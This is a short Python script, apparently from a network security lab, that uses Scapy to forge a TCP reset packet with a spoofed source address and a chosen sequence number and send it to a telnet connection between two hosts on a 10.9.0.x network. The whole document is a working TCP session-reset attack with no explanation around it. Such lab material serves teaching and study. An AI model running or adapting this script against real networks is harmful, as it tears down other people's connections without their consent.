from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=59420, dport=23, flags="R", seq=2829348515)
pkt = ip/tcp
ls(pkt)
send(pkt, iface="br-b4697936b45b", verbose=0)
